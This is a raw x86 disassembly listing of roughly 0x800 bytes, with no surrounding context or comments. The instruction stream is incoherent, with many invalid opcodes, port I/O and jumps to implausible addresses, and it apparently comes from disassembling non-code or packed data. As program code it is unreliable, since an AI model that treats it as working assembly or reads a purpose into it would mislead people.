  420138:	lods   al,BYTE PTR ds:[esi]
  420139:	add    bh,bh
  42013b:	cmp    al,0x68
  42013d:	jnp    0x420181
  42013f:	fldpi  
  420141:	mov    esp,0x619f720b
  420146:	inc    eax
  420147:	mov    ds:0xc8046c6,al
  42014c:	push   ecx
  42014d:	dec    eax
  42014e:	cmc    
  42014f:	and    al,0x49
  420151:	push   es
  420152:	je     0x420154
  420154:	sub    ebp,DWORD PTR [eax]
  420156:	std    
  420157:	push   esi
  420158:	arpl   cx,si
  42015a:	(bad)  
  42015b:	call   0x3db9cb
  420160:	mul    DWORD PTR [eax]
  420162:	xchg   DWORD PTR [eax-0xdc],eax
  420168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420169:	cmp    esi,eax
  42016b:	cmp    esp,DWORD PTR [ebx+0x2b]
  42016e:	add    DWORD PTR [ecx+0x10e7e239],ecx
  420174:	jecxz  0x420165
  420176:	mov    edi,0xd5a64a8b
  42017b:	sbb    ebp,DWORD PTR [ebx-0x6348f44b]
  420181:	mov    DWORD PTR [ecx-0x1c],0x0
  420188:	add    BYTE PTR [edi+0x3c],ah
  42018b:	or     al,0x8b
  42018d:	or     DWORD PTR [edx-0x79],ecx
  420190:	pop    ebp
  420191:	aam    0xc6
  420193:	test   BYTE PTR [eax],al
  420195:	fld    QWORD PTR ds:0x56128b00
  42019b:	xchg   DWORD PTR [ebp-0x64],ecx
  42019e:	mov    BYTE PTR [esp+eax*1+0x3b00059d],0x7b
  4201a6:	add    eax,0x58e7e84
  4201ab:	add    BYTE PTR [ecx+0x657fae59],cl
  4201b1:	lods   al,BYTE PTR ds:[esi]
  4201b2:	push   DWORD PTR [ebx+0x4]
  4201b5:	ss jmp esi
  4201b8:	push   es
  4201b9:	ret    0xc0
  4201bc:	je     0x420144
  4201be:	mov    WORD PTR [ecx+eax*1-0x6b1b3c29],gs
  4201c5:	inc    edi
  4201c6:	mov    ah,0xfb
  4201c8:	mov    DWORD PTR [ecx-0x179a801e],edi
  4201ce:	and    al,0x74
  4201d0:	add    al,0x75
  4201d2:	add    eax,0x7173e903
  4201d7:	inc    ebp
  4201d8:	aas    
  4201d9:	leave  
  4201da:	push   ebp
  4201db:	mov    ecx,0x3ed471af
  4201e0:	out    0xad,eax
  4201e2:	xor    al,0x51
  4201e4:	cld    
  4201e5:	cld    
  4201e6:	cmc    
  4201e7:	pop    ebx
  4201e8:	sbb    BYTE PTR [eax+0x73f8b3],0x0
  4201ef:	add    BYTE PTR [eax],al
  4201f1:	add    BYTE PTR [ecx+0x35],dh
  4201f4:	add    ebp,ecx
  4201f6:	jnp    0x4201a1
  4201f8:	inc    ebp
  4201f9:	jno    0x77f1bb64
  4201ff:	aam    0x3e
  420201:	out    0x99,eax
  420203:	fs push ecx
  420205:	cld    
  420206:	(bad)  
  420207:	cwde   
  420208:	lock cld 
  42020a:	and    eax,0x7500035f
  42020f:	into   
  420210:	mov    bh,0xf7
  420212:	fisubr DWORD PTR [edx+0x5ad2ff00]
  420218:	fisub  DWORD PTR [ebx+0x2c]
  42021b:	add    ebx,DWORD PTR [eax]
  42021d:	or     dl,al
  42021f:	(bad)  
  420220:	jge    0x420219
  420222:	out    dx,al
  420223:	popf   
  420224:	dec    eax
  420225:	xor    BYTE PTR [ebp-0x568587b8],0xdb
  42022c:	dec    eax
  42022d:	add    al,0x2a
  42022f:	out    0xdd,eax
  420231:	out    dx,eax
  420232:	inc    edx
  420233:	sub    ah,dh
  420235:	aaa    
  420236:	push   0x75a7041b
  42023b:	pop    ebx
  42023c:	add    BYTE PTR [eax+0x9],al
  42023f:	test   DWORD PTR [eax+0x39a7aff],0x30fd4589
  420249:	cmp    BYTE PTR [esi+ecx*1-0x9],al
  42024d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42024e:	jne    0x420252
  420250:	out    0x7,eax
  420252:	cmc    
  420253:	int    0xf6
  420255:	mov    eax,0x0
  42025a:	add    BYTE PTR [ecx-0x12],dl
  42025d:	(bad)  
  42025e:	clc    
  42025f:	mov    al,BYTE PTR [edx]
  420261:	fs inc esp
  420263:	(bad)  
  420264:	std    
  420265:	outs   dx,DWORD PTR ds:[esi]
  420266:	(bad)  
  420267:	ds jl  0x4202e8
  42026a:	xchg   DWORD PTR [ecx],esi
  42026c:	iret   
  42026d:	ret    
  42026e:	mov    eax,0x50d60d12
  420273:	and    DWORD PTR [ebx+0xb55d7a6],ebx
  420279:	fcom   QWORD PTR [edi-0x7a]
  42027c:	in     eax,dx
  42027d:	rol    BYTE PTR [ebx],0xa0
  420280:	inc    edi
  420281:	repz pop es
  420283:	retw   0xdde6
  420287:	sti    
  420288:	(bad)  
  42028a:	mov    bl,0xfd
  42028c:	daa    
  42028d:	ds jb  0x420273
  420290:	inc    edi
  420291:	sub    eax,0xe74a3749
  420296:	add    esi,DWORD PTR [ebp+0x2]
  420299:	adc    cl,al
  42029b:	std    
  42029c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42029d:	sbb    al,BYTE PTR [edi-0x4b343153]
  4202a3:	shr    ebp,0xe2
  4202a6:	idiv   BYTE PTR [edx+0x2]
  4202a9:	fs inc esp
  4202ab:	es out 0x6b,al
  4202ae:	push   ecx
  4202af:	es cld 
  4202b1:	mov    cl,0x30
  4202b3:	es add ch,bl
  4202b6:	(bad)  
  4202b7:	xchg   esi,eax
  4202b8:	call   DWORD PTR [edx+0x2]
  4202bb:	cli    
  4202bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202bd:	ror    BYTE PTR [eax+0x0],cl
  4202c0:	add    BYTE PTR [eax],al
  4202c2:	add    BYTE PTR [eax],al
  4202c4:	aaa    
  4202c5:	dec    edx
  4202c6:	out    0x3,eax
  4202c8:	jne    0x4202cc
  4202ca:	jb     0x420318
  4202cc:	(bad)  
  4202cd:	lock addr16 into 
  4202d0:	jp     0x4202d3
  4202d2:	add    BYTE PTR [ecx+0x76],ch
  4202d5:	add    dh,BYTE PTR [esp+ebx*8+0x40]
  4202d9:	dec    eax
  4202da:	jmpw   0x4a16
  4202de:	xor    edx,eax
  4202e0:	scas   al,BYTE PTR es:[edi]
  4202e1:	mov    eax,0x84a596f6
  4202e6:	cld    
  4202e7:	fdivp  st(2),st
  4202e9:	mov    ch,0xfe
  4202eb:	call   0x51847e66
  4202f0:	out    0xad,al
  4202f2:	les    ebp,FWORD PTR [ecx+ecx*1]
  4202f5:	or     eax,DWORD PTR [eax]
  4202f7:	jmp    0x79544872
  4202fc:	and    al,BYTE PTR [edi]
  4202fe:	add    BYTE PTR [esi+esi*4-0xa],ah
  420302:	sbb    DWORD PTR [esi+esi*2],0x2
  420306:	add    dh,bl
  420308:	(bad)  [ebx-0x3c2209f1]
  42030e:	or     ebp,DWORD PTR [eax]
  420310:	pop    ecx
  420311:	test   DWORD PTR [eax],0xf7cbf111
  420317:	call   0x119720e7
  42031c:	(bad)  
  42031d:	in     eax,dx
  42031e:	cld    
  42031f:	push   ds
  420320:	out    dx,al
  420321:	out    0x73,al
  420323:	in     eax,dx
  420324:	dec    ecx
  420325:	dec    edx
  420326:	call   0x420418
  42032b:	add    BYTE PTR [eax],al
  42032d:	inc    ecx
  42032e:	les    ecx,FWORD PTR [edi]
  420330:	shl    BYTE PTR [ebx+0x3e360c86],cl
  420336:	jp     0x42037a
  420338:	in     eax,0x89
  42033a:	ret    
  42033b:	mov    ebx,0xcf70d28
  420340:	sahf   
  420341:	xor    edx,edi
  420343:	not    edx
  420345:	jbe    0x4203c0
  420347:	jp     0x42032a
  420349:	test   ebx,0xf4aae9ef
  42034f:	push   eax
  420350:	add    BYTE PTR [ebx+0x26],bl
  420353:	popf   
  420354:	add    BYTE PTR [edx+eax*1+0x68],bl
  420358:	add    DWORD PTR [esi+0x2],ebx
  42035b:	add    bl,ch
  42035d:	ds mov al,0x41
  420360:	or     BYTE PTR [eax+0x2e],cl
  420363:	sbb    DWORD PTR [ebx-0x75],edx
  420366:	es sahf 
  420368:	add    BYTE PTR [edx+eax*1+0x68],bl
  42036c:	add    cl,BYTE PTR [esi+0x2]
  42036f:	add    bh,bh
  420371:	cmp    DWORD PTR [edx-0x713bba77],edi
  420377:	sti    
  420378:	jne    0x42031a
  42037a:	leave  
  42037b:	ret    0x36e8
  42037e:	mov    ecx,0x338ffffb
  420383:	call   0x4f8a2b88
  420388:	push   edi
  420389:	xor    al,0x9d
  42038b:	cld    
  42038c:	dec    DWORD PTR [edx+ebp*1]
  42038f:	add    eax,DWORD PTR [edx]
  420391:	add    BYTE PTR [eax],al
  420393:	add    BYTE PTR [eax],al
  420395:	add    BYTE PTR [edx+eax*1],cl
  420398:	out    0x12,eax
  42039a:	stos   BYTE PTR es:[edi],al
  42039b:	cmp    eax,DWORD PTR [eax+eax*2]
  42039e:	sub    BYTE PTR [ebx+0x4f],dl
  4203a1:	push   edi
  4203a2:	mov    ah,0x69
  4203a4:	cld    
  4203a5:	dec    esp
  4203a7:	sub    DWORD PTR [edx+eax*1],eax
  4203aa:	fadd   QWORD PTR [ecx]
  4203ac:	sti    
  4203ad:	jne    0x420413
  4203af:	add    DWORD PTR [ecx-0x58],0xfffffffc
  4203b3:	mov    ah,0x71
  4203b5:	cld    
  4203b6:	inc    edi
  4203b7:	mov    esp,0xb576f3e4
  4203bc:	sti    
  4203bd:	and    DWORD PTR [ecx],0xffffffa9
  4203c0:	cld    
  4203c1:	jae    0x420385
  4203c3:	nop
  4203c4:	push   ebx
  4203c5:	push   0x1e8
  4203ca:	and    al,0xfa
  4203cc:	add    DWORD PTR [eax],eax
  4203ce:	jne    0x42042b
  4203d0:	pop    ecx
  4203d1:	adc    DWORD PTR [ebx+0x10ffc1e],ecx
  4203d7:	pop    esi
  4203d8:	mov    cl,0x54
  4203da:	fnstsw WORD PTR [esi+0x0]
  4203dd:	add    BYTE PTR [ebp-0x3d],dh
  4203e0:	push   es
  4203e1:	add    dh,BYTE PTR [ebp+0x5b]
  4203e4:	dec    ebp
  4203e5:	jb     0x420444
  4203e7:	into   
  4203e8:	(bad)  
  4203e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203eb:	xlat   BYTE PTR fs:[ebx]
  4203ed:	sti    
  4203ee:	(bad)  
  4203ef:	xchg   esp,eax
  4203f0:	pop    eax
  4203f1:	mov    ebx,0xf54d743f
  4203f6:	mov    al,0x53
  4203f8:	add    esi,DWORD PTR [eax+eax*1+0x0]
  4203fc:	add    BYTE PTR [eax],al
  4203fe:	add    BYTE PTR [eax-0x2a984b18],dl
  420404:	pop    edx
  420405:	add    BYTE PTR [eax],al
  420407:	lea    ebx,[ebx-0x2]
  42040a:	push   DWORD PTR [ebp-0x24]
  42040d:	xlat   BYTE PTR ds:[ebx]
  42040e:	test   DWORD PTR [eax],0xa4f989e
  420414:	es dec esp
  420416:	mov    BYTE PTR [ebx],bh
  420418:	ret    
  420419:	imul   edi,ecx,0xfffffffa
  42041c:	mov    ebx,0x5b7d4255
  420421:	clc    
  420422:	(bad)  
  420423:	jmp    0x4049:0x756a2586
  42042a:	mov    BYTE PTR [ebx-0x2de9450e],ch
  420430:	jecxz  0x42042f
  420432:	mov    ah,0x38
  420434:	inc    edi
  420435:	std    
  420436:	mov    ah,0xb5
  420438:	xchg   DWORD PTR [ebx-0x22],eax
  42043b:	gs push eax
  42043d:	cmp    BYTE PTR [esi+0x1d],cl
  420440:	push   ecx
  420441:	(bad)  
  420442:	push   DWORD PTR [ebp+0x4c]
  420445:	aam    0xfb
  420447:	mov    ds:0x3513782d,al
  42044c:	add    ah,bh
  42044e:	lods   al,BYTE PTR ds:[esi]
  42044f:	xor    BYTE PTR [ecx+0x27a42af],ch
  420455:	fld    QWORD PTR [edi]
  420457:	sbb    eax,0x71042937
  42045c:	into   
  42045d:	or     DWORD PTR [esi+esi*1+0x73],ebx
  420461:	mov    ebp,0x4d
  420466:	add    BYTE PTR [eax],al
  420468:	test   BYTE PTR [edx+0x3a],0xea
  42046c:	in     eax,dx
  42046d:	cmc    
  42046e:	push   cs
  42046f:	cmp    DWORD PTR [ebp-0x2c6b09fe],esi
  420475:	(bad)  
  420476:	out    0x3,eax
  420478:	jne    0x42046d
  42047a:	pop    ebp
  42047b:	jnp    0x4204bf
  42047d:	add    esp,edi
  42047f:	add    edi,edx
  420481:	(bad)  
  420482:	(bad)  
  420483:	clc    
  420484:	repz aas 
  420486:	jge    0x4204af
  420488:	pop    ebp
  420489:	out    dx,al
  42048a:	es add al,0x2b
  42048d:	dec    BYTE PTR [esi]
  42048f:	aas    
  420490:	mov    ch,0x2
  420492:	jmp    0x42046b
  420494:	dec    edx
  420495:	pop    edx
  420496:	js     0x42050c
  420498:	or     DWORD PTR [edx+ebp*2+0x44],eax
  42049c:	xchg   BYTE PTR [ebx],dl
  42049e:	(bad)  
  42049f:	enter  0xfe56,0x6b
  4204a3:	inc    esp
  4204a4:	popw   ds
  4204a6:	jb     0x4204a7
  4204a8:	inc    edx
  4204a9:	aaa    
  4204aa:	test   eax,0xe679ec03
  4204af:	add    dh,BYTE PTR [ebp+0x2]
  4204b2:	jo     0x4204b0
  4204b4:	std    
  4204b5:	cmc    
  4204b6:	mov    esi,0x62023538
  4204bb:	jnp    0x420533
  4204bd:	add    edi,esp
  4204bf:	add    esi,edx
  4204c1:	mov    edx,0xc2b510ea
  4204c6:	sub    BYTE PTR [eax],cl
  4204c8:	jne    0x4204d9
  4204ca:	add    BYTE PTR [ecx],ch
  4204cc:	add    BYTE PTR [eax],al
  4204ce:	add    BYTE PTR [eax],al
  4204d0:	add    BYTE PTR [esp+ecx*2],bh
  4204d3:	cld    
  4204d4:	(bad)  
  4204d5:	cli    
  4204d6:	out    dx,eax
  4204d7:	aas    
  4204d8:	jmp    0xac9a0505
  4204dd:	mov    ch,0x43
  4204df:	add    BYTE PTR [ebp+0x63],bl
  4204e2:	pop    edx
  4204e3:	dec    eax
  4204e4:	jns    0x42050f
  4204e6:	inc    esi
  4204e7:	sub    DWORD PTR [ecx+0x219f204a],0xffffffac
  4204ee:	ret    0x61ff
  4204f1:	and    bl,BYTE PTR [edi]
  4204f3:	add    al,0x60
  4204f5:	fiadd  WORD PTR [ebx-0x1]
  4204f8:	call   0xc5857e73
  4204fd:	dec    esi
  4204fe:	jp     0x42050a
  420500:	xor    DWORD PTR [edx+eax*8-0x1],edi
  420504:	pop    edi
  420505:	idiv   esi
  420507:	(bad)  
  420508:	call   0x2a021683
  42050d:	mov    bh,0xfb
  42050f:	push   DWORD PTR [ebp+0x5b]
  420512:	push   es
  420513:	adc    al,0x29
  420515:	jno    0x420563
  420517:	add    al,cl
  420519:	push   ebx
  42051a:	ret    0xe4ff
  42051d:	lds    ebp,FWORD PTR [esp+edx*2+0x85b3bdd]
  420524:	jns    0x4204cf
  420526:	inc    esi
  420527:	sub    DWORD PTR [ecx],0xffffffca
  42052a:	push   es
  42052b:	mov    DWORD PTR [ebp+0x3f30f292],ebx
  420531:	ins    DWORD PTR es:[edi],dx
  420532:	and    al,0x72
  420534:	aam    0x0
  420536:	add    BYTE PTR [eax],al
  420538:	add    BYTE PTR [eax],al
  42053a:	and    BYTE PTR [ebp-0x7a6225ab],ch
  420540:	inc    edi
  420541:	xor    dh,BYTE PTR [ebp+0x29e6e442]
  420547:	inc    esi
  420548:	cld    
  420549:	scas   al,BYTE PTR es:[edi]
  42054a:	or     BYTE PTR [edx-0x15fff3f],ch
  420550:	cli    
  420551:	adc    eax,0x3c4f9c
  420556:	add    dl,BYTE PTR [edx+0x4c8bf887]
  42055c:	add    BYTE PTR ds:0xf836fe5c,dl
  420562:	and    DWORD PTR [ecx],eax
  420564:	push   esi
  420565:	push   esi
  420566:	inc    ebx
  420567:	mov    ds:0xa2cc33d3,eax
  42056c:	fstp   DWORD PTR [edi-0x66]
  42056f:	jno    0x42056c
  420571:	and    eax,0x3c3298
  420576:	and    al,BYTE PTR [eax+ebx*2]
  420579:	int    0x8f
  42057b:	push   es
  42057c:	add    al,0x74
  42057e:	popf   
  42057f:	fidiv  WORD PTR [eax-0x7f321471]
  420585:	shl    BYTE PTR [eax+0xe],0xfb
  420589:	adc    eax,0x3c374c
  42058e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42058f:	cmp    edx,DWORD PTR [ebx+ecx*8+0x5f]
  420593:	push   es
  420594:	xor    eax,0x71881
  420599:	add    BYTE PTR [ecx],ah
  42059b:	das    
  42059c:	dec    edi
  42059d:	push   esi
  42059e:	add    BYTE PTR [eax],al
  4205a0:	add    BYTE PTR [eax],al
  4205a2:	add    BYTE PTR [edi-0x3a],ch
  4205a5:	dec    esp
  4205a6:	push   eax
  4205a7:	int3   
  4205a8:	sbb    bh,dl
  4205aa:	mov    esi,0x4000d4
  4205af:	mov    ah,0xa0
  4205b1:	repnz (bad) 
  4205b3:	cmp    ebx,DWORD PTR [ecx]
  4205b5:	rcr    BYTE PTR [esi+0x1c],0x71
  4205b9:	mov    edi,0x11ccd16a
  4205be:	test   BYTE PTR [esi-0x63cd03bb],bh
  4205c4:	leave  
  4205c5:	sti    
  4205c6:	and    eax,0x3c31b8
  4205cb:	jne    0x4205ee
  4205cd:	call   DWORD PTR [edi-0x58]
  4205d0:	ins    BYTE PTR es:[edi],dx
  4205d1:	add    BYTE PTR [ebx+ecx*2],al
  4205d4:	mov    edi,0xb016e7bd
  4205d9:	dec    eax
  4205da:	cld    
  4205db:	stc    
  4205dc:	jmp    0x4205ad
  4205de:	inc    ecx
  4205df:	call   0x7d2b:0x350f0056
  4205e6:	or     ch,BYTE PTR ds:0x3dffc574
  4205ec:	stos   BYTE PTR es:[edi],al
  4205ed:	hlt    
  4205ee:	(bad)  
  4205ef:	jp     0x42061c
  4205f1:	iret   
  4205f2:	and    eax,0xfef8b9fe
  4205f7:	push   0x2b
  4205f9:	jg     0x4205f0
  4205fb:	jmp    0x813eb80b
  420600:	dec    edi
  420601:	out    dx,eax
  420602:	aas    
  420603:	jne    0x4205b3
  420605:	inc    eax
  420606:	jb     0x420608
  420608:	add    BYTE PTR [eax],al
  42060a:	add    BYTE PTR [eax],al
  42060c:	pusha  
  42060d:	cld    
  42060e:	mov    bl,0x4f
  420610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420611:	pop    esp
  420612:	sub    eax,0xc564adbd
  420617:	call   FWORD PTR [edx]
  420619:	lock push ecx
  42061b:	cld    
  42061c:	sub    ah,ah
  42061e:	adc    al,0xc0
  420620:	ret    
  420621:	ins    BYTE PTR es:[edi],dx
  420622:	jge    0x4205e9
  420624:	mov    ebx,0x58fca66c
  420629:	imul   ebp,esp,0x3f
  42062c:	jne    0x4205da
  42062e:	les    esp,FWORD PTR [ebx]
  420630:	jns    0x42065d
  420632:	int3   
  420633:	test   BYTE PTR ss:[esi+0x1c],0x4
  420638:	bnd jle 0x42064d
  42063b:	and    ebx,0x76
  42063e:	push   ss
  42063f:	idiv   BYTE PTR [eax-0x6d]
  420642:	aaa    
  420643:	inc    eax
  420644:	jne    0x42066d
  420646:	int3   
  420647:	and    bl,ch
  420649:	add    DWORD PTR ds:0x6240c979,ebx
  42064f:	inc    ebx
  420650:	inc    esi
  420651:	push   ds
  420652:	dec    eax
  420653:	stos   DWORD PTR es:[edi],eax
  420654:	lods   eax,DWORD PTR ds:[esi]
  420655:	(bad)  
  420656:	out    0x7e,al
  420658:	xor    al,BYTE PTR [edx]
  42065a:	call   0xa4cd7b62
  42065f:	out    dx,eax
  420660:	add    ebx,edx
  420662:	and    esi,eax
  420664:	call   0xe640:0x93ff668b
  42066b:	jp     0x42069d
  42066d:	sbb    ch,BYTE PTR [ecx+0x0]
  420673:	add    BYTE PTR [eax],al
  420675:	jne    0x42064f
  420677:	popa   
  420678:	rcl    BYTE PTR [esi+0xa],1
  42067b:	ss dec ecx
  42067d:	out    0xe6,al
  42067f:	fimul  WORD PTR [eax-0x1a]
  420682:	out    0xde,al
  420684:	dec    eax
  420685:	out    0xe6,al
  420687:	into   
  420688:	mov    cl,0x59
  42068a:	push   ss
  42068b:	adc    esi,eax
  42068d:	xchg   edx,eax
  42068e:	add    dh,BYTE PTR [edx+0x4c]
  420691:	mov    eax,ds:0x41497a2a
  420696:	inc    eax
  420697:	popa   
  420698:	inc    ecx
  420699:	cdq    
  42069a:	loopne 0x420644
  42069c:	hlt    
  42069d:	xor    dl,dh
  42069f:	jno    0x420671
  4206a1:	push   esi
  4206a2:	or     dl,BYTE PTR [esi]
  4206a4:	dec    ecx
  4206a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206a6:	out    0xce,al
  4206a8:	dec    eax
  4206a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206aa:	out    0xce,al
  4206ac:	dec    eax
  4206ad:	xchg   dh,ah
  4206af:	(bad)  
  4206b0:	mov    cl,0x9
  4206b2:	push   ss
  4206b3:	adc    ebp,edi
  4206b5:	inc    edx
  4206b6:	add    ah,BYTE PTR [edx+0x4c]
  4206b9:	mov    eax,ds:0xf148d22a
  4206be:	aas    
  4206bf:	jno    0x420702
  4206c1:	dec    ecx
  4206c2:	loopne 0x4206ec
  4206c4:	hlt    
  4206c5:	loop   0x42069d
  4206c7:	jmp    DWORD PTR [ecx+0x3d]
  4206ca:	aad    0x88
  4206cc:	mov    ah,0xce
  4206ce:	(bad)  
  4206cf:	cld    
  4206d0:	pushf  
  4206d1:	fidivr WORD PTR [esi]
  4206d3:	jb     0x4206ca
  4206d5:	sub    eax,0x160fb4
  4206da:	add    BYTE PTR [eax],al
  4206dc:	add    BYTE PTR [eax],al
  4206de:	stos   BYTE PTR es:[edi],al
  4206df:	or     edx,DWORD PTR [esi+0xe]
  4206e2:	mov    ds:0x76a9139b,al
  4206e7:	mov    edi,esi
  4206e9:	xchg   esi,eax
  4206ea:	ds leave 
  4206ec:	cld    
  4206ed:	imul   BYTE PTR ds:0xdc8ec48a
  4206f3:	fadd   st(1),st
  4206f5:	std    
  4206f6:	jbe    0x4206cb
  4206f8:	mov    ch,cl
  4206fa:	les    ecx,FWORD PTR [edx+0x3ec5e172]
  420700:	jb     0x4206f3
  420702:	mov    ebp,0x3bc613b4
  420707:	paddw  mm6,QWORD PTR [ebx*2-0x7923032b]
  42070f:	push   ss
  420710:	inc    eax
  420711:	jmp    0x91963ee7
  420716:	pop    ebp
  420717:	ds cld 
  420719:	sahf   
  42071a:	rol    DWORD PTR [esi+0x5c],0x37
  42071e:	adc    al,BYTE PTR [ecx+0x13]
  420721:	jmp    0x1b2d9109
  420726:	sbb    BYTE PTR [ecx+0x38],0xaa
  42072a:	cmp    ecx,DWORD PTR [edi]
  42072c:	mov    DWORD PTR [ebx*1-0x42b0bed9],esp
  420733:	cmp    BYTE PTR ds:[edx],ch
  420736:	xor    eax,DWORD PTR [ebx]
  420738:	xor    DWORD PTR [ecx],ebp
  42073a:	mov    eax,ds:0xadba50eb
  42073f:	mov    ah,0xf
  420741:	mov    bh,0x0
  420743:	add    BYTE PTR [eax],al
  420745:	add    BYTE PTR [eax],al
  420747:	es ds jb 0x42074b
  42074b:	loopne 0x4207c2
  42074d:	sti    
  42074e:	jne    0x420734
  420750:	leave  
  420751:	adc    DWORD PTR [eax-0x43],esp
  420754:	inc    edx
  420755:	cld    
  420756:	cmp    bl,BYTE PTR [edi-0x4ec61fb7]
  42075c:	xor    bh,BYTE PTR [edx+0xf]
  42075f:	push   ecx
  420760:	aaa    
  420761:	sub    al,0x38
  420763:	add    eax,0xc70770ca
  420768:	jg     0x420776
  42076a:	jge    0x4206fa
  42076c:	mov    ebx,0xc5015b15
  420771:	or     BYTE PTR [eax],al
  420773:	stc    
  420774:	mov    ebp,0x32d98be8
  420779:	push   edx
  42077a:	push   edi
  42077b:	es push es
  42077d:	sti    
  42077e:	jne    0x420710
  420780:	adc    esi,esi
  420782:	call   FWORD PTR [ecx]
  420784:	ds in  al,0x9e
  420787:	inc    ebx
  420788:	(bad)  
  420789:	sti    
  42078a:	mov    esi,DWORD PTR [esp+eax*4]
  42078d:	sti    
  42078e:	jg     0x4207e8
  420790:	adc    eax,eax
  420792:	jmp    0x4207fa
  420794:	jge    0x4207e9
  420796:	call   0x3c9a8d
  42079b:	(bad)  
  42079c:	(bad)  
  42079d:	xor    esi,0x4587d568
  4207a3:	cmp    al,0x71
  4207a5:	push   ebx
  4207a6:	dec    DWORD PTR [ecx+0x5f893a]
  4207ac:	add    BYTE PTR [eax],al
  4207ae:	add    BYTE PTR [eax],al
  4207b0:	repz lds esi,FWORD PTR [ecx+0x8]
  4207b4:	add    al,0x53
  4207b6:	sti    
  4207b7:	jmp    DWORD PTR [ebx+0x1674bf09]
  4207bd:	jo     0x4207a3
  4207bf:	retf   
  4207c0:	call   0x4c760389
  4207c5:	fld    DWORD PTR [edi]
  4207c7:	mov    esi,DWORD PTR [ebp+0x6e]
  4207ca:	in     al,dx
  4207cb:	xor    BYTE PTR [ebp-0x727901a9],0xb0
  4207d2:	cmp    eax,0xa79d4258
  4207d7:	rol    DWORD PTR [ebp-0x79f886d5],0x19
  4207de:	scas   al,BYTE PTR es:[edi]
  4207df:	cmp    BYTE PTR [edi+ebx*4+0x27b580f1],0x79
  4207e7:	das    
  4207e8:	jle    0x420789
  4207ea:	sbb    al,0x8
  4207ec:	sub    DWORD PTR [ebp-0x42],ebx
  4207ef:	xor    BYTE PTR [ebp+0x27cf092f],0x3b
  4207f6:	push   cs
  4207f7:	sar    BYTE PTR [ebx],0xe9
  4207fa:	(bad)  
  4207fb:	inc    ebp
  4207fd:	sub    bl,BYTE PTR [ecx-0x9]
  420800:	and    BYTE PTR [eax+0x2f917e54],dh
  420806:	add    eax,DWORD PTR [eax]
  420808:	jne    0x420807
  42080a:	adc    dh,dh
  42080c:	(bad)  
  42080d:	in     eax,0xf3
  42080f:	cmp    BYTE PTR [ebx],dh
  420811:	std    
  420812:	mov    dh,0x80
  420814:	add    BYTE PTR [eax],al
  420816:	add    BYTE PTR [eax],al
  420818:	add    BYTE PTR [ebp+0x7c],bl
  42081b:	int3   
  42081c:	adc    ah,BYTE PTR [esi+0x76e78b99]
  420822:	sub    eax,DWORD PTR [eax]
  420824:	cmc    
  420825:	inc    esp
  420826:	adc    dh,BYTE PTR [edx]
  420828:	out    0x76,eax
  42082a:	sub    eax,DWORD PTR [eax]
  42082c:	xchg   DWORD PTR [eax+0x31527b93],esi
  420832:	mov    al,ds:0xbcb50fbf
  420837:	sub    BYTE PTR [eax],bl
  420839:	xor    eax,0x56f7b7ae
  42083e:	push   0xffffffb0
  420840:	push   ebp
  420841:	stos   DWORD PTR es:[edi],eax
  420842:	fidivr WORD PTR [edi-0xd]
  420845:	or     eax,DWORD PTR [edx]
  420847:	inc    si
  420849:	mov    dl,0xd4
  42084b:	and    eax,0x553c0680
  420850:	inc    esi
  420851:	repz cmp al,0xe6
  420854:	add    esi,edx
  420856:	jle    0x420896
  420858:	inc    ebp
  420859:	loope  0x420897
  42085b:	cmp    eax,0xa716d6f0
  420860:	add    esi,esp
  420862:	cmp    edi,esp
  420864:	rcr    BYTE PTR [esp+edx*8+0x3d6ed025],1
  42086b:	xchg   ebx,eax
  42086c:	sti    
  42086d:	and    DWORD PTR ds:0xc28787fb,edi
  420873:	out    0xa,al
  420875:	mov    bl,0xbb
  420877:	ficomp WORD PTR [esi+esi*1]
  42087a:	push   cs
  42087b:	call   0x420940
  420880:	add    BYTE PTR [eax],al
  420882:	jb     0x42087f
  420884:	jnp    0x42087d
  420886:	adc    DWORD PTR [ebp-0x48bcbc47],ecx
  42088c:	repnz hlt 
  42088e:	out    0x41,al
  420890:	cmp    al,0x3b
  420892:	mov    ah,0xd
  420894:	out    0x11,eax
  420896:	xor    eax,0xfdafd528
  42089b:	cs pop ss
  42089d:	lods   eax,DWORD PTR ds:[esi]
  42089e:	dec    ebp
  42089f:	sbb    edi,DWORD PTR [esi+0x33876acf]
  4208a5:	cld    
  4208a6:	push   ecx
  4208a7:	into   
  4208a8:	fcmovu st,st(1)
  4208aa:	dec    ebx
  4208ab:	(bad)  
  4208ac:	sub    eax,DWORD PTR [ebp-0x4e]
  4208af:	sub    dh,BYTE PTR ds:0x6a3c3945
  4208b5:	inc    esp
  4208b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b7:	or     eax,0x27ec76a
  4208bc:	cld    
  4208bd:	popa   
  4208be:	rol    BYTE PTR [ecx],cl
  4208c0:	push   ds
  4208c1:	cmp    esi,DWORD PTR [edi+ecx*1]
  4208c4:	add    cl,ch
  4208c6:	fs inc edx
  4208c8:	call   0xfd7e3843
  4208cd:	frstor [edx+0x12]
  4208d0:	std    
  4208d1:	aad    0x5a
  4208d3:	adc    bh,ch
  4208d5:	fst    QWORD PTR [edx-0x2d0b02ee]
  4208db:	adc    eax,0xc66de940
  4208e0:	and    ebp,ebp
  4208e2:	loope  0x420873
  4208e4:	mov    edi,0x2b
  4208e9:	add    BYTE PTR [eax],al
  4208eb:	int    0x3b
  4208ed:	or     eax,0x69d5c876
  4208f2:	out    dx,eax
  4208f3:	pushf  
  4208f4:	cmp    al,0x4c
  4208f6:	push   ds
  4208f7:	retf   0x1607
  4208fa:	test   eax,0x6aef8976
  4208ff:	xor    edi,DWORD PTR [esi]
  420901:	jae    0x4208d1
  420903:	test   DWORD PTR [edx+0x65],eax
  420906:	push   0x70
  420908:	add    BYTE PTR ds:0x80c3395c,cl
  42090e:	or     DWORD PTR ds:0xc905bf82,esp
  420914:	(bad)  
  420915:	push   ebp
  420916:	fimul  WORD PTR [ebx+0x7929123b]
  42091c:	jg     0x4208dd
  42091e:	push   ebp
